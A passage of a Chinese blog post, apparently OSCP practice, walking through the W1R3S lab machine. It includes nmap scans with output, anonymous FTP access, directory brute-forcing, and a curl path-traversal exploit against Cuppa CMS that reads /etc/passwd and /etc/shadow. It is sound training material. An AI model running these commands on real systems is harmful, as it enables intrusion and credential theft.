@@ -1,0 +1,685 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/icon.png">
+  <link rel="icon" href="/img/icon.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="So1Lupus">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="W1R3S靶机wp明确目标内网网段扫描1nmap -sn 192.168.137.0&#x2F;24  ​	此处为本地靶机，目标ip地址为：192.168.137.4 信息收集阶段主动扫描tcp扫描(SYN扫描)1nmap -sS --min-rate 10000 -p- 192.168.137.4   扫描获得21，22，80，3306端口开放 然后对指定端口进行进一步的扫描  1nmap -sS -sV">
+<meta property="og:type" content="article">
+<meta property="og:title" content="w1r3s">
+<meta property="og:url" content="http://example.com/2022/12/20/w1r3s/index.html">
+<meta property="og:site_name" content="So1Lupus">
+<meta property="og:description" content="W1R3S靶机wp明确目标内网网段扫描1nmap -sn 192.168.137.0&#x2F;24  ​	此处为本地靶机，目标ip地址为：192.168.137.4 信息收集阶段主动扫描tcp扫描(SYN扫描)1nmap -sS --min-rate 10000 -p- 192.168.137.4   扫描获得21，22，80，3306端口开放 然后对指定端口进行进一步的扫描  1nmap -sS -sV">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/w1r3s/image-20221220200652159.png">
+<meta property="article:published_time" content="2022-12-20T12:42:32.000Z">
+<meta property="article:modified_time" content="2023-03-06T14:04:53.000Z">
+<meta property="article:author" content="So1Lupus">
+<meta property="article:tag" content="OSCP备考">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/w1r3s/image-20221220200652159.png">
+  
+  
+  
+  <title>w1r3s - So1Lupus</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.3","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml"};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>So1Lupus</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              &nbsp;<i class="iconfont icon-search"></i>&nbsp;
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="w1r3s"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-12-20 20:42" pubdate>
+          2022年12月20日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          7.1k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          60 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">w1r3s</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="W1R3S靶机wp"><a href="#W1R3S靶机wp" class="headerlink" title="W1R3S靶机wp"></a>W1R3S靶机wp</h1><h2 id="明确目标"><a href="#明确目标" class="headerlink" title="明确目标"></a>明确目标</h2><h3 id="内网网段扫描"><a href="#内网网段扫描" class="headerlink" title="内网网段扫描"></a>内网网段扫描</h3><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sn <span class="hljs-number">192.168.137.0</span>/<span class="hljs-number">24</span><br></code></pre></td></tr></table></figure>
+
+<p>​	此处为本地靶机，目标ip地址为：192.168.137.4</p>
+<h2 id="信息收集阶段"><a href="#信息收集阶段" class="headerlink" title="信息收集阶段"></a>信息收集阶段</h2><h3 id="主动扫描"><a href="#主动扫描" class="headerlink" title="主动扫描"></a>主动扫描</h3><h4 id="tcp扫描-SYN扫描"><a href="#tcp扫描-SYN扫描" class="headerlink" title="tcp扫描(SYN扫描)"></a>tcp扫描(SYN扫描)</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sS --min-rate <span class="hljs-number">10000</span> -p- <span class="hljs-number">192.168.137.4</span> <br></code></pre></td></tr></table></figure>
+
+<p>扫描获得21，22，80，3306端口开放</p>
+<p>然后对指定端口进行进一步的扫描 </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sS -sV -O -p21,<span class="hljs-number">22</span>,<span class="hljs-number">80</span>,<span class="hljs-number">3306</span> <span class="hljs-number">192.168.137.4</span><br></code></pre></td></tr></table></figure>
+
+<p>扫描结果如下：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">TCPscan</span><br><span class="hljs-attribute">PORT</span>     STATE SERVICE VERSION<br><span class="hljs-attribute">21</span>/tcp   open  ftp     vsftpd <span class="hljs-number">2</span>.<span class="hljs-number">0</span>.<span class="hljs-number">8</span> or later<br><span class="hljs-attribute">22</span>/tcp   open  ssh     OpenSSH <span class="hljs-number">7</span>.<span class="hljs-number">2</span>p2 Ubuntu <span class="hljs-number">4</span>ubuntu2.<span class="hljs-number">4</span> (Ubuntu Linux; protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-attribute">80</span>/tcp   open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">18</span> ((Ubuntu))<br><span class="hljs-attribute">3306</span>/tcp open  mysql   MySQL (unauthorized)<br><span class="hljs-attribute">MAC</span> Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">59</span>:<span class="hljs-number">30</span>:<span class="hljs-number">73</span> (VMware)<br><span class="hljs-attribute">Warning</span>: OSScan results may be unreliable because we could not find at least <span class="hljs-number">1</span> open and <span class="hljs-number">1</span> closed port<br><span class="hljs-attribute">Device</span> type: general purpose<br><span class="hljs-attribute">Running</span>: Linux <span class="hljs-number">3</span>.X|<span class="hljs-number">4</span>.X<br><span class="hljs-attribute">OS</span> CPE: cpe:/o:linux:linux_kernel:<span class="hljs-number">3</span> cpe:/o:linux:linux_kernel:<span class="hljs-number">4</span><br><span class="hljs-attribute">OS</span> details: Linux <span class="hljs-number">3</span>.<span class="hljs-number">10</span> - <span class="hljs-number">4</span>.<span class="hljs-number">11</span>, Linux <span class="hljs-number">3</span>.<span class="hljs-number">2</span> - <span class="hljs-number">4</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Network</span> Distance: <span class="hljs-number">1</span> hop<br><span class="hljs-attribute">Service</span> Info: Host: W1R3S.inc; OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure>
+
+<p>​	进一步利用nmap自带的vuln脚本进行简单漏扫</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -script=vuln -p21,<span class="hljs-number">22</span>,<span class="hljs-number">80</span>,<span class="hljs-number">3306</span> <span class="hljs-number">192.168.137.4</span><br></code></pre></td></tr></table></figure>
+
+<p>扫描结果如下:</p>
+<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs coq">PORT     STATE SERVICE<br><span class="hljs-number">21</span>/tcp   open  ftp<br><span class="hljs-number">22</span>/tcp   open  ssh<br><span class="hljs-number">80</span>/tcp   open  http<br>| <span class="hljs-type">http</span>-slowloris-check: <br>|   <span class="hljs-type">VULNERABLE</span>:<br>|   <span class="hljs-type">Slowloris</span> DOS attack<br>|     <span class="hljs-type">State</span>: LIKELY VULNERABLE<br>|     <span class="hljs-type">IDs</span>:  CVE:CVE<span class="hljs-number">-2007</span><span class="hljs-number">-6750</span><br>|       <span class="hljs-type">Slowloris</span> tries to keep many connections to the target web server open and hold<br>|       <span class="hljs-type">them</span> open <span class="hljs-built_in">as</span> long <span class="hljs-built_in">as</span> possible.  It accomplishes this <span class="hljs-built_in">by</span> opening connections to<br>|       <span class="hljs-type">the</span> target web server and sending a partial request. By doing so, it starves<br>|       <span class="hljs-type">the</span> http server&#x27;s resources causing Denial Of Service.<br>|       <br><span class="hljs-type">|     Disclosure</span> date: <span class="hljs-number">2009</span><span class="hljs-number">-09</span><span class="hljs-number">-17</span><br>|     <span class="hljs-type">References</span>:<br>|       <span class="hljs-type">https</span>://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE<span class="hljs-number">-2007</span><span class="hljs-number">-6750</span><br>|<span class="hljs-type">_</span>      http://ha.ckers.org/slowloris/<br>|<span class="hljs-type">_http</span>-csrf: Couldn&#x27;t find any CSRF vulnerabilities.<br>| <span class="hljs-type">http</span>-enum: <br>|<span class="hljs-type">_</span>  /wordpress/wp-login.php: Wordpress login page.<br>|<span class="hljs-type">_http</span>-dombased-xss: Couldn&#x27;t find any DOM based XSS.<br>|<span class="hljs-type">_http</span>-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.<br><span class="hljs-number">3306</span>/tcp open  mysql<br></code></pre></td></tr></table></figure>
+
+
+
+<h4 id="udp扫描"><a href="#udp扫描" class="headerlink" title="udp扫描"></a>udp扫描</h4><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">nmap</span> -sU --min-rate <span class="hljs-number">10000</span> -p- <span class="hljs-number">192.168.137.4</span><br></code></pre></td></tr></table></figure>
+
+<p>扫描结果如下</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">PORT</span>     STATE  SERVICE<br><span class="hljs-attribute">3306</span>/udp closed mysql<br><span class="hljs-attribute">MAC</span> Address: <span class="hljs-number">00</span>:<span class="hljs-number">0</span>C:<span class="hljs-number">29</span>:<span class="hljs-number">59</span>:<span class="hljs-number">30</span>:<span class="hljs-number">73</span> (VMware)<br></code></pre></td></tr></table></figure>
+
+<h2 id="FTP端口"><a href="#FTP端口" class="headerlink" title="FTP端口"></a>FTP端口</h2><p>存在ftp端口</p>
+<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">ftp</span> <span class="hljs-number">192.168.137.4</span><br></code></pre></td></tr></table></figure>
+
+<p>进入到ftp服务器中，此处利用匿名进行试探</p>
+<p>即用户名为:anonymous，密码为空</p>
+<p>成功登录。</p>
+<p>进入后有三个目录，总体内容信息整理如下：</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs livescript"><span class="hljs-number">02.txt</span><br><br><span class="hljs-number">01ec</span>2d8fc11c493b25029fb1f47f39ce : MD5 : This <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> a password<br><br><br>SXQgaXMgZWFzeSwgYnV0IG5vdCB0aGF0IGVhc3kuLg== : base64 : It <span class="hljs-keyword">is</span> easy, but <span class="hljs-keyword">not</span> <span class="hljs-literal">that</span> easy..<br><br><span class="hljs-number">03.txt</span> <br>___________.__              __      __  ______________________   _________    .__               <br><span class="hljs-string">\__</span>    ___<span class="hljs-regexp">/|  |__   ____   /</span>  <span class="hljs-string">\</span>    /  <span class="hljs-string">\/_</span>   <span class="hljs-string">\______</span>   <span class="hljs-string">\_____</span>  <span class="hljs-string">\</span> /   _____/    |__| ____   ____  <br>  |    |   |  |  <span class="hljs-string">\_/</span> __ <span class="hljs-string">\</span>  <span class="hljs-string">\</span>   <span class="hljs-string">\/\/</span>   / |   ||       _/ _(__  &lt; <span class="hljs-string">\_____</span>  <span class="hljs-string">\</span>     |  |/    <span class="hljs-string">\_/</span> ___<span class="hljs-string">\</span> <br>  |    |   |   Y  <span class="hljs-string">\</span>  ___/   <span class="hljs-string">\</span>        /  |   ||    |   <span class="hljs-string">\/</span>       <span class="hljs-string">\/</span>        <span class="hljs-string">\</span>    |  |   |  <span class="hljs-string">\</span>  <span class="hljs-string">\___</span> <br>  |____|   |___|  <span class="hljs-regexp">/\___  &gt;   \__/</span><span class="hljs-string">\</span>  /   |___||____|_  <span class="hljs-regexp">/______  /_______  /</span> <span class="hljs-regexp">/\ |__|___|  /</span><span class="hljs-string">\___</span>  &gt;<br>                <span class="hljs-string">\/</span>     <span class="hljs-string">\/</span>         <span class="hljs-string">\/</span>                <span class="hljs-string">\/</span>       <span class="hljs-string">\/</span>        <span class="hljs-string">\/</span>  <span class="hljs-string">\/</span>         <span class="hljs-string">\/</span>     <span class="hljs-string">\/</span> <br><br>employs-name.txt<br>Naomi.W - Manager<br>Hector.A - IT Dept<br>Joseph.G - Web Design<br>Albert.O - Web Design<br>Gina.L - Inventory<br>Rico.D - Human Resources<br><br>worktodo.txt<br>we have a ןot <span class="hljs-keyword">of</span> work <span class="hljs-keyword">to</span> <span class="hljs-keyword">do</span>‘ stop pןayıng around˙˙˙˙<br>ı don<span class="hljs-string">&#x27;t thınk thıs ıs the way to root!</span><br></code></pre></td></tr></table></figure>
+
+<p>可以发现此处并没有我们想要的信息</p>
+<h2 id="80端口探测"><a href="#80端口探测" class="headerlink" title="80端口探测"></a>80端口探测</h2><p>利用浏览器登入，发现没有用</p>
+<p><img src="/./w1r3s/image-20221220200652159.png" srcset="/img/loading.gif" lazyload alt="image-20221220200652159"></p>
+<p>然后进行目录爆破，利用feroxburster进行爆破，获取有效信息整理如下：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span>/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span>/administrator :Cuppa CMS<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/javascript =&gt; http:/</span><span class="hljs-regexp">/192.168.137.4/</span>javascript/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/wordpress =&gt; http:/</span><span class="hljs-regexp">/192.168.137.4/</span>wordpress/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/javascript/</span>jquery =&gt; http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/javascript/</span>jquery/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>components =&gt; http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>components/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>templates =&gt; http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>templates/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/m</span>edia =&gt; http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/m</span>edia/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>language =&gt; http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>language/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>js =&gt; http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>js/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>api =&gt; http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>api/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>classes =&gt; http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>classes/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/wordpress/</span>wp-includes =&gt; http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/wordpress/</span>wp-includes/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/wordpress/</span>wp-admin =&gt; http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/wordpress/</span>wp-admin/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>api<span class="hljs-regexp">/administrator =&gt; http:/</span><span class="hljs-regexp">/192.168.137.4/</span>administrator<span class="hljs-regexp">/api/</span>administrator/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>api<span class="hljs-regexp">/test =&gt; http:/</span><span class="hljs-regexp">/192.168.137.4/</span>administrator<span class="hljs-regexp">/api/</span>test/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/wordpress/</span>wp-content =&gt; http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/wordpress/</span>wp-content/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>classes<span class="hljs-regexp">/ajax =&gt; http:/</span><span class="hljs-regexp">/192.168.137.4/</span>administrator<span class="hljs-regexp">/classes/</span>ajax/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>components<span class="hljs-regexp">/menu =&gt; http:/</span><span class="hljs-regexp">/192.168.137.4/</span>administrator<span class="hljs-regexp">/components/m</span>enu/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>components<span class="hljs-regexp">/menu/</span>classes =&gt; http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>components<span class="hljs-regexp">/menu/</span>classes/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>components<span class="hljs-regexp">/menu/</span>html =&gt; http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>components<span class="hljs-regexp">/menu/</span>html/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>templates<span class="hljs-regexp">/default =&gt; http:/</span><span class="hljs-regexp">/192.168.137.4/</span>administrator<span class="hljs-regexp">/templates/</span>default/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/i</span>nstallation =&gt; http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/i</span>nstallation/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>components<span class="hljs-regexp">/stats =&gt; http:/</span><span class="hljs-regexp">/192.168.137.4/</span>administrator<span class="hljs-regexp">/components/</span>stats/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>components<span class="hljs-regexp">/permissions =&gt; http:/</span><span class="hljs-regexp">/192.168.137.4/</span>administrator<span class="hljs-regexp">/components/</span>permissions/<br></code></pre></td></tr></table></figure>
+
+<p>可以发现，内容主要有三类，一类是wordpress目录下的，一类是javascript目录下的，一类是administrator目录下的。这都是我们的可利用攻击面，此处我选择了先对administrator进行探测。</p>
+<p>然后获取到几个信息</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">Cuppa Cms<br>Administrator account :<span class="hljs-keyword">default</span>:  username::<span class="hljs-keyword">admin</span> <span class="hljs-keyword">password</span>::<span class="hljs-keyword">admin</span>  <br>Administrator<span class="hljs-string">&#x27;s user created  No =&gt; admin account already have </span><br></code></pre></td></tr></table></figure>
+
+<p>然后利用searchsploit对cuppa cms进行了简单搜查，然后搜查到了一个任意文件包含漏洞</p>
+<p>有可能跟编码有关，但我们同时也可以注意到这里是Request，所以我们在尝试一下利用post进行访问</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">curl -d urlConfig=..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/../</span>..<span class="hljs-regexp">/etc/</span>passwd http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">137.4</span><span class="hljs-regexp">/administrator/</span>alerts/alertConfigField.php<br></code></pre></td></tr></table></figure>
+
+
+<p>发现成功利用，于是我们在试着能不能搜集到&#x2F;etc&#x2F;shadow的信息，发现可以搜集到</p>
